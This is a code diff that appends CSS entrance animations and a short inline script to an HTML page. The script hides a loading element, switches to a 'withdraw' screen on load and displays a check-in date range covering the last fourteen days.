+      animation: oneSlideUp 0.5s cubic-bezier(0.22, 1, 0.36, 1) both;
+      animation-delay: 0.18s;
+    }
+
+    #dashboard.is-active .line {
+      animation: oneFadeIn 0.4s ease both;
+      animation-delay: 0.32s;
+    }
+
+    #dashboard.is-active .entre,
+    #dashboard.is-active .concluiu {
+      animation: oneSlideUp 0.45s cubic-bezier(0.22, 1, 0.36, 1) both;
+      animation-delay: 0.38s;
+    }
+
+    #dashboard.is-active .dia {
+      animation: oneSlideUp 0.45s cubic-bezier(0.22, 1, 0.36, 1) both;
+      animation-delay: 0.48s;
+    }
+  </style>
+
+  <script>
+    (function () {
+      var idEl = document.getElementById('loading');
+      if (idEl) { idEl.classList.remove('is-active'); idEl.style.display = 'none'; }
+      document.addEventListener('DOMContentLoaded', function () {
+        var h = location.hash.replace('#', '');
+        if (!h || h === 'loading' || h === 'dashboard') {
+          if (typeof window.showScreen === 'function') window.showScreen('withdraw', false);
+        }
+      });
+
+      (function () {
+        var el = document.getElementById('checkin-dates');
+        if (!el) return;
+        var MONTHS = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
+        var today = new Date();
+        var start = new Date(today);
+        start.setDate(today.getDate() - 14);
+        var fmt = function (d) { return MONTHS[d.getMonth()] + ' ' + d.getDate(); };
+        el.textContent = '\u2022 ' + fmt(start) + ' - ' + fmt(today);
+      })();
+    })();
+  </script>
+
+
+
+
+
+
+</body>
+
+</html>
